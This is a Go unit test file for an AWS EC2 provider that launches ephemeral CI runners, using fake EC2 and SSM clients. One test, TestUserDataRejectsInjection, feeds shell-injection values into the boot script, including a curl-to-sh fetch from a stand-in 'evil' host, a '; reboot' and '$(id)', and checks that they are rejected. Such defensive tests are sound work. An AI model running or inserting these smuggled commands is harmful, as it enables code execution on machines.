package aws

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
	"sync"
	"testing"

	"github.com/wizenheimer/airship/apps/api/internal/agent"
	"github.com/wizenheimer/airship/apps/api/internal/agentproto"

	awssdk "github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	ec2types "github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/aws/aws-sdk-go-v2/service/ssm"
	ssmtypes "github.com/aws/aws-sdk-go-v2/service/ssm/types"
	"github.com/aws/smithy-go"
)

type fakeEC2 struct {
	mu        sync.Mutex
	runs      []*ec2.RunInstancesInput
	failures  []error // consumed by RunInstances in order
	listed    *ec2.DescribeInstancesInput
	instances []ec2types.Instance
}

func (f *fakeEC2) RunInstances(_ context.Context, in *ec2.RunInstancesInput, _ ...func(*ec2.Options)) (*ec2.RunInstancesOutput, error) {
	f.mu.Lock()
	defer f.mu.Unlock()
	f.runs = append(f.runs, in)
	if len(f.failures) > 0 {
		err := f.failures[0]
		f.failures = f.failures[1:]
		if err != nil {
			return nil, err
		}
	}

	return &ec2.RunInstancesOutput{Instances: []ec2types.Instance{{InstanceId: awssdk.String("i-123")}}}, nil
}

func (f *fakeEC2) DescribeInstances(_ context.Context, in *ec2.DescribeInstancesInput, _ ...func(*ec2.Options)) (*ec2.DescribeInstancesOutput, error) {
	f.listed = in

	return &ec2.DescribeInstancesOutput{Reservations: []ec2types.Reservation{{Instances: f.instances}}}, nil
}

func (f *fakeEC2) TerminateInstances(context.Context, *ec2.TerminateInstancesInput, ...func(*ec2.Options)) (*ec2.TerminateInstancesOutput, error) {
	return nil, &smithy.GenericAPIError{Code: "InvalidInstanceID.NotFound"}
}

func (f *fakeEC2) DescribeImages(_ context.Context, in *ec2.DescribeImagesInput, _ ...func(*ec2.Options)) (*ec2.DescribeImagesOutput, error) {
	return &ec2.DescribeImagesOutput{Images: []ec2types.Image{{ImageId: awssdk.String(in.ImageIds[0]), RootDeviceName: awssdk.String("/dev/sda1")}}}, nil
}

type fakeSSM struct{}

func (fakeSSM) GetParameter(context.Context, *ssm.GetParameterInput, ...func(*ssm.Options)) (*ssm.GetParameterOutput, error) {
	return &ssm.GetParameterOutput{Parameter: &ssmtypes.Parameter{Value: awssdk.String("ami-ubuntu")}}, nil
}

func testLaunch() agentproto.Launch {
	return agentproto.Launch{
		RunnerID: "0199d1a8-6f2b-7c1e-9a3b-2f6c1d2e3f40", RunnerName: "airship-abc", Repository: "acme/api",
		JITConfig: "ZXlKaGJHY2lPaUpJVXpJMU5pSjk=", RunnerVersion: "2.338.2", MaxLifetimeSeconds: 3600,
		Profile: agentproto.LaunchProfile{Label: "airship-4cpu", Arch: "x64", InstanceType: "c7i.xlarge", DiskGB: 100, Spot: true},
	}
}

func newProvider(t *testing.T, ec2Client *fakeEC2) *Provider {
	t.Helper()
	p, err := New(ec2Client, fakeSSM{}, Config{Subnets: []string{"subnet-a", "subnet-b"}, SecurityGroups: []string{"sg-1"}, SpotFallback: true})
	if err != nil {
		t.Fatal(err)
	}

	return p
}

func TestLaunchRequest(t *testing.T) {
	t.Parallel()
	ec2Client := &fakeEC2{}
	id, err := newProvider(t, ec2Client).Launch(context.Background(), "dp-1", testLaunch())
	if err != nil || id != "i-123" {
		t.Fatalf("launch = %q, %v", id, err)
	}
	in := ec2Client.runs[0]
	if awssdk.ToString(in.ImageId) != "ami-ubuntu" {
		t.Errorf("image = %s; ssm default not resolved", awssdk.ToString(in.ImageId))
	}
	if in.InstanceInitiatedShutdownBehavior != ec2types.ShutdownBehaviorTerminate {
		t.Error("instance must terminate on shutdown")
	}
	if in.MetadataOptions.HttpTokens != ec2types.HttpTokensStateRequired || awssdk.ToInt32(in.MetadataOptions.HttpPutResponseHopLimit) != 1 {
		t.Error("IMDSv2 must be required with hop limit 1")
	}
	if in.InstanceMarketOptions == nil || in.InstanceMarketOptions.MarketType != ec2types.MarketTypeSpot {
		t.Error("spot profile launched on demand")
	}
	ebs := in.BlockDeviceMappings[0].Ebs
	if awssdk.ToInt32(ebs.VolumeSize) != 100 || !awssdk.ToBool(ebs.Encrypted) || !awssdk.ToBool(ebs.DeleteOnTermination) {
		t.Errorf("root volume = %+v", ebs)
	}
	if !strings.HasPrefix(awssdk.ToString(in.ClientToken), testLaunch().RunnerID) || len(awssdk.ToString(in.ClientToken)) > 64 {
		t.Errorf("client token %q must derive from the runner and fit EC2's 64 chars", awssdk.ToString(in.ClientToken))
	}
	tags := map[string]string{}
	for _, tag := range in.TagSpecifications[0].Tags {
		tags[awssdk.ToString(tag.Key)] = awssdk.ToString(tag.Value)
	}
	if tags[TagDataPlane] != "dp-1" || tags[TagRunner] != testLaunch().RunnerID {
		t.Errorf("tags = %v", tags)
	}
	script, _ := base64.StdEncoding.DecodeString(awssdk.ToString(in.UserData))
	if !strings.Contains(string(script), "ACTIONS_RUNNER_INPUT_JITCONFIG='"+testLaunch().JITConfig+"'") {
		t.Error("user data does not pass the jit config through the environment")
	}
}

func capacityErr() error { return &smithy.GenericAPIError{Code: "InsufficientInstanceCapacity"} }

func TestLaunchFallsBackToOnDemandThenAnotherSubnet(t *testing.T) {
	t.Parallel()
	// spot in subnet 1 fails, on-demand in subnet 1 fails, subnet 2 works.
	ec2Client := &fakeEC2{failures: []error{capacityErr(), capacityErr(), nil}}
	if _, err := newProvider(t, ec2Client).Launch(context.Background(), "dp-1", testLaunch()); err != nil {
		t.Fatal(err)
	}
	if len(ec2Client.runs) != 3 {
		t.Fatalf("attempts = %d, want 3", len(ec2Client.runs))
	}
	if ec2Client.runs[1].InstanceMarketOptions != nil {
		t.Error("second attempt should be on demand")
	}
	if awssdk.ToString(ec2Client.runs[0].SubnetId) == awssdk.ToString(ec2Client.runs[2].SubnetId) {
		t.Error("third attempt should use the other subnet")
	}
	tokens := map[string]bool{}
	for _, run := range ec2Client.runs {
		tokens[awssdk.ToString(run.ClientToken)] = true
	}
	if len(tokens) != 3 {
		t.Error("each different request needs its own client token, or EC2 rejects it as a mismatch")
	}
}

func TestLaunchErrorsAreClassified(t *testing.T) {
	t.Parallel()
	for code, retryable := range map[string]bool{"InsufficientInstanceCapacity": true, "RequestLimitExceeded": true, "InvalidAMIID.NotFound": false, "UnauthorizedOperation": false} {
		failures := []error{&smithy.GenericAPIError{Code: code}, &smithy.GenericAPIError{Code: code}, &smithy.GenericAPIError{Code: code}, &smithy.GenericAPIError{Code: code}}
		_, err := newProvider(t, &fakeEC2{failures: failures}).Launch(context.Background(), "dp-1", testLaunch())
		var launchErr *agent.LaunchError
		if !errors.As(err, &launchErr) || launchErr.Retryable != retryable {
			t.Errorf("%s: retryable = %v, want %v", code, launchErr != nil && launchErr.Retryable, retryable)
		}
	}
}

func TestListFiltersByDataPlaneAndMarksShuttingDown(t *testing.T) {
	t.Parallel()
	ec2Client := &fakeEC2{instances: []ec2types.Instance{
		{InstanceId: awssdk.String("i-1"), State: &ec2types.InstanceState{Name: ec2types.InstanceStateNameRunning}, Tags: []ec2types.Tag{{Key: awssdk.String(TagRunner), Value: awssdk.String("r1")}}},
		{InstanceId: awssdk.String("i-2"), State: &ec2types.InstanceState{Name: ec2types.InstanceStateNameShuttingDown}},
	}}
	list, err := newProvider(t, ec2Client).List(context.Background(), "dp-1")
	if err != nil {
		t.Fatal(err)
	}
	if list[0].RunnerID != "r1" || list[0].Stopping || !list[1].Stopping {
		t.Fatalf("list = %+v", list)
	}
	if v := ec2Client.listed.Filters[0].Values; awssdk.ToString(ec2Client.listed.Filters[0].Name) != "tag:"+TagDataPlane || v[0] != "dp-1" {
		t.Fatal("listing is not scoped to the data plane's tag")
	}
}

func TestTerminateIgnoresMissingInstances(t *testing.T) {
	t.Parallel()
	if err := newProvider(t, &fakeEC2{}).Terminate(context.Background(), "i-gone"); err != nil {
		t.Fatal(err)
	}
}

func TestUserDataRejectsInjection(t *testing.T) {
	t.Parallel()
	for name, mutate := range map[string]func(*agentproto.Launch){
		"jit":     func(l *agentproto.Launch) { l.JITConfig = "abc'; curl evil | sh; '" },
		"version": func(l *agentproto.Launch) { l.RunnerVersion = "2.338.2; reboot" },
		"arch":    func(l *agentproto.Launch) { l.Profile.Arch = "x64$(id)" },
	} {
		launch := testLaunch()
		mutate(&launch)
		if _, err := userData(launch); err == nil {
			t.Errorf("%s: unsafe value accepted into the boot script", name)
		}
	}
	launch := testLaunch()
	launch.JITConfig = strings.Repeat("A", 4000) // real configs are ~2-3 KB
	if _, err := userData(launch); err != nil {
		t.Fatalf("realistic jit config rejected: %v", err)
	}
}

// A repeated launch of one runner must send an identical request, so EC2's
// client token returns the first instance instead of rejecting the call.
func TestRepeatedLaunchSendsTheSameRequest(t *testing.T) {
	fake := &fakeEC2{}
	p, err := New(fake, fakeSSM{}, Config{Subnets: []string{"subnet-a", "subnet-b", "subnet-c"}, SpotFallback: true})
	if err != nil {
		t.Fatal(err)
	}
	for range 3 {
		if _, err := p.Launch(context.Background(), "dp-1", testLaunch()); err != nil {
			t.Fatal(err)
		}
	}
	for _, run := range fake.runs[1:] {
		if *run.ClientToken != *fake.runs[0].ClientToken || *run.SubnetId != *fake.runs[0].SubnetId {
			t.Fatalf("repeat launch sent token %s in %s, first sent %s in %s",
				*run.ClientToken, *run.SubnetId, *fake.runs[0].ClientToken, *fake.runs[0].SubnetId)
		}
	}

	other := testLaunch()
	subnets := map[string]bool{}
	for i := range 30 {
		other.RunnerID = fmt.Sprintf("0199d1a8-0000-7000-8000-%012d", i)
		if _, err := p.Launch(context.Background(), "dp-1", other); err != nil {
			t.Fatal(err)
		}
		subnets[*fake.runs[len(fake.runs)-1].SubnetId] = true
	}
	if len(subnets) != 3 {
		t.Fatalf("30 runners landed in %d of 3 subnets", len(subnets))
	}
}
